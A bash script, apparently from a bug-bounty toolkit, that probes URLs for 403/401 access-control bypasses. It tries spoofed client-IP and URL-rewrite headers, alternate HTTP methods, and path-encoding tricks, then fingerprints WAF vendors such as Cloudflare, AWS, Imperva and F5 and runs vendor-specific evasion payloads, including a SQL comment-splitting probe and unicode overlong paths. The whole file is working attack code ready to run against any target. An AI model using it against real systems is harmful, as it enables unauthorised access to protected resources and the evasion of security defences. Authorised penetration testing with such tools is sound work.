#!/bin/bash
# =============================================================================
# 403/401 Bypass Probe — try common header/method/encoding tricks against a URL
#
# Wraps byp4xx (lobuhi) when present. Falls back to a built-in matrix of the
# most-paid bypass techniques from disclosed reports so it works out of the box.
#
# Usage:
#   ./tools/bypass_403.sh <url>
#   ./tools/bypass_403.sh -l <urls-file>     # one URL per line, parallelised
# =============================================================================

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/external_arsenal.sh"

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; MAG='\033[0;35m'; NC='\033[0m'
log()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
hit()  { echo -e "${MAG}[BYPASS]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1" >&2; }

URL=""; LIST=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    -l|--list) shift; LIST="${1:-}" ;;
    -h|--help) sed -n '2,10p' "$0"; exit 0 ;;
    *) URL="$1" ;;
  esac
  shift
done

[ -z "$URL" ] && [ -z "$LIST" ] && { err "url or -l <file> required"; exit 2; }

OUT_DIR="${BYPASS_OUT_DIR:-$(pwd)/findings/bypass/$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUT_DIR"

if _have byp4xx; then
  log "byp4xx bypass matrix..."
  if [ -n "$URL" ]; then
    byp4xx -u "$URL" 2>/dev/null > "$OUT_DIR/byp4xx.txt" || true
  else
    byp4xx -L "$LIST" 2>/dev/null > "$OUT_DIR/byp4xx.txt" || true
  fi
  ok "byp4xx done — see $OUT_DIR/byp4xx.txt"
  exit 0
fi

# Built-in fallback — most common header / method / path tricks
_fingerprint_waf() {
  local target="$1"
  local hdrs body waf="unknown"
  hdrs=$(curl -sIk --max-time 6 "$target" 2>/dev/null)
  body=$(curl -sk --max-time 6 "$target" 2>/dev/null | head -c 4000)
  if _have wafw00f; then
    local w
    w=$(wafw00f "$target" 2>/dev/null | grep -Eo 'is behind .*' | head -1 || true)
    [ -n "$w" ] && waf="$w"
  fi
  echo "$hdrs" | grep -qi "cf-ray\|__cfduid\|cf-cache-status\|cf-request-id" && waf="cloudflare"
  echo "$hdrs" | grep -qi "x-amzn-requestid\|x-amzn-trace-id\|x-amz-cf-id" && waf="aws"
  echo "$hdrs" | grep -qi "akamai-x-\|akamaighost\|x-akamai" && waf="akamai"
  echo "$hdrs" | grep -qi "x-cdn: imperva\|x-iinfo" && waf="imperva"
  echo "$hdrs" | grep -qi "incap_ses\|visid_incap" && waf="imperva"
  echo "$hdrs" | grep -qEi "set-cookie:.*TS[0-9a-f]{6,}" && waf="f5-bigip"
  echo "$hdrs" | grep -qi "x-sucuri-id" && waf="sucuri"
  echo "$body" | grep -qi "mod_security\|ModSecurity\|NAXSI" && waf="modsecurity"
  printf '%s' "$waf"
}

_probe_one() {
  local target="$1" found=0
  local base="${target%/*}"      # strip last segment
  local last="${target##*/}"
  local waf
  waf=$(_fingerprint_waf "$target")
  log "WAF fingerprint: $waf"
  echo "target=$target waf=$waf" >> "$OUT_DIR/waf_fingerprint.txt"
  log "probing $target"
  for combo in \
    "GET|$target|X-Original-URL: $target" \
    "GET|$target|X-Rewrite-URL: $target" \
    "GET|$target|X-Forwarded-For: 127.0.0.1" \
    "GET|$target|X-Forwarded-Host: localhost" \
    "GET|$target|X-Custom-IP-Authorization: 127.0.0.1" \
    "GET|$target|X-Client-IP: 127.0.0.1" \
    "GET|$target|X-Host: localhost" \
    "GET|${base}/%2e/${last}|" \
    "GET|${base}/.${last}|" \
    "GET|${base}/${last}/|" \
    "GET|${base}/${last}/.|" \
    "GET|${base}/${last};/|" \
    "GET|${base}/${last}..;/|" \
    "GET|${base}/${last}.json|" \
    "GET|${base}/${last}#|" \
    "POST|$target|" \
    "PUT|$target|" \
    "PATCH|$target|" \
    "TRACE|$target|" \
    "GET|$target|True-Client-IP: 127.0.0.1" \
    "GET|$target|CF-Connecting-IP: 127.0.0.1" \
    "GET|$target|X-Originating-IP: 127.0.0.1" \
    "GET|$target|X-ProxyUser-Ip: 127.0.0.1" \
    "GET|$target|Client-IP: 127.0.0.1" \
    "GET|$target|Forwarded: for=127.0.0.1" \
    "GET|$target|X-Remote-Addr: 127.0.0.1" \
    "GET|$target|X-Remote-IP: 127.0.0.1" \
    "GET|$target|Via: 1.1 127.0.0.1" \
    "GET|$target|X-HTTP-Method-Override: GET" \
    "GET|${base}/%252e/${last}|" \
    "GET|${base}/${last}%20|" \
    "GET|${base}/${last}%09|" \
    "GET|${base}/${last}.html|" \
    "GET|${base}/${last}.css|" \
    "GET|${base}//${last}|" \
    "GET|${base}/./${last}|" \
    "POST|$target|Content-Type: application/json" \
    "POST|$target|Content-Type: multipart/form-data; boundary=x" ; do
    method=$(echo "$combo" | cut -d'|' -f1)
    url=$(echo "$combo" | cut -d'|' -f2)
    hdr=$(echo "$combo" | cut -d'|' -f3)
    args=( -sk -o /dev/null -w "%{http_code}" --max-time 5 -X "$method" )
    [ -n "$hdr" ] && args+=( -H "$hdr" )
    code=$(curl "${args[@]}" "$url" 2>/dev/null || echo 0)
    if [ "$code" = "200" ] || [ "$code" = "201" ] || [ "$code" = "204" ]; then
      hit "$method  $url  $hdr  → HTTP $code"
      echo "$method|$url|$hdr|$code" >> "$OUT_DIR/bypass_hits.txt"
      found=1
    fi
  done
  # Vendor-specific bypass based on fingerprint
  case "$waf" in
    cloudflare)
      log "cloudflare: trying TE+X-Forwarded-Host..."
      code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 \
        -H "Transfer-Encoding: chunked" -H "X-Forwarded-Host: localhost" \
        "$target" 2>/dev/null || echo 0)
      if [ "$code" = "200" ] || [ "$code" = "201" ] || [ "$code" = "204" ]; then
        hit "cloudflare TE+XFH → $code"; echo "CF-TE+XFH|$target||$code" >> "$OUT_DIR/bypass_hits.txt"; found=1
      fi
      ;;
    aws)
      log "aws: trying comment-splitting on param..."
      code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 \
        "${target}?id=1/**/AND/**/1=1" 2>/dev/null || echo 0)
      if [ "$code" = "200" ] || [ "$code" = "201" ] || [ "$code" = "204" ]; then
        hit "aws comment-split → $code"; echo "AWS-comment|$target||$code" >> "$OUT_DIR/bypass_hits.txt"; found=1
      fi
      ;;
    imperva)
      log "imperva: trying unicode overlong..."
      code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 \
        "${base}/%c0%2e%c0%2e/${last}" 2>/dev/null || echo 0)
      if [ "$code" = "200" ] || [ "$code" = "201" ] || [ "$code" = "204" ]; then
        hit "imperva unicode overlong → $code"; echo "IMPERVA-unicode|$target||$code" >> "$OUT_DIR/bypass_hits.txt"; found=1
      fi
      ;;
    f5-bigip)
      log "f5: trying path normalisation bypass..."
      code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 \
        "${base}/%2f%2f${last}" 2>/dev/null || echo 0)
      if [ "$code" = "200" ] || [ "$code" = "201" ] || [ "$code" = "204" ]; then
        hit "f5-bigip double-slash → $code"; echo "F5-doubleslash|$target||$code" >> "$OUT_DIR/bypass_hits.txt"; found=1
      fi
      ;;
  esac
  [ "$found" = "0" ] && ok "no bypass on $target"
}

if [ -n "$URL" ]; then
  _probe_one "$URL"
else
  while IFS= read -r u; do
    [ -z "$u" ] && continue
    _probe_one "$u"
  done < "$LIST"
fi

log "Output written to: $OUT_DIR"
[ -f "$OUT_DIR/bypass_hits.txt" ] && ok "bypass_hits.txt: $(wc -l < "$OUT_DIR/bypass_hits.txt") hit(s) found"
[ -f "$OUT_DIR/waf_fingerprint.txt" ] && log "waf_fingerprint.txt: $(cat "$OUT_DIR/waf_fingerprint.txt")"
